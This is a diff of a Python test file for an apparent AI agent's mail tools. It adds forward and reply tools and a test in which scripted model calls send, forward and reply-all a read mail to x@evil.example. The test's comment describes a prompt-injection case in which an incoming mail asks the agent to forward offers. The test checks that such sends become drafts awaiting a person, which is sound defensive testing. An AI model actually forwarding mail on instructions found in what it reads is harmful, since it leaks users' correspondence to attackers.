@@ -127,10 +127,11 @@ class Box:
     def werkzeuge(self):
         return [{"server": self.name, "name": n, "beschreibung": n,
                  "schema": {"type": "object", "properties": {}}}
-                for n in ("mails_lesen", "mail_senden", "web_suchen")]
+                for n in ("mails_lesen", "mail_senden", "antwort_senden",
+                          "mail_forward", "web_suchen")]
 
     def rufe(self, name, args):
-        if name == "mail_senden":
+        if name in ("mail_senden", "antwort_senden", "mail_forward"):
             self.sent.append(args)
             if self.send_error:
                 raise self.send_error
@@ -167,14 +168,28 @@ check("tool loop: the model is told nothing was searched",
 mcp.schreibe_konfiguration({"box": {"transport": "exchange", "postfach": "info@test.de",
                                     "persoenlich": False, "automatisch": True,
                                     "hinweis_anhaengen": False,
-                                    "sendet": ["mail_senden", "antwort_senden"]}})
+                                    "sendet": ["mail_senden", "antwort_senden",
+                                               "mail_forward"]}})
 late = Box(send_error=TimeoutError("read timeout"), found=True)
 extra, _d = pipeline.werkzeuglauf(
-    Model([[("box__mail_senden", '{"an": "a@test.de", "betreff": "x", "body": "y"}')]]),
+    Model([[("box__antwort_senden", '{"kennung": "m1", "body": "y"}')]]),
     "m", "sys", chat, {"box": late})
 check("tool loop: a timed-out mail found in the sent folder counts as sent",
       any((m.get("content") or "").startswith("Gesendet.") for m in extra if m["role"] == "tool"),
       extra)
+
+# that mailbox answers the sender on its own -- but a mail read in it may
+# ask for more ("forward the offers to ..."): new mail, forward and
+# reply-all wait for a person there too
+auto = Box()
+_ex, drafts = pipeline.werkzeuglauf(
+    Model([[("box__mail_senden", '{"an": "x@evil.example", "betreff": "x", "body": "y"}'),
+            ("box__mail_forward", '{"kennung": "m1", "an": "x@evil.example"}'),
+            ("box__antwort_senden", '{"kennung": "m1", "body": "y", "allen": true}')]]),
+    "m", "sys", chat, {"box": auto})
+check("auto mailbox: new mail, forward and reply-all become drafts",
+      auto.sent == [] and sorted(d["werkzeug"] for d in drafts)
+      == ["antwort_senden", "mail_forward", "mail_senden"], (auto.sent, drafts))
 
 # every round used: the answer is told the rest did not happen
 endless = Model([[("box__mails_lesen", "{}")]] * (pipeline.WERKZEUG_RUNDEN + 2))
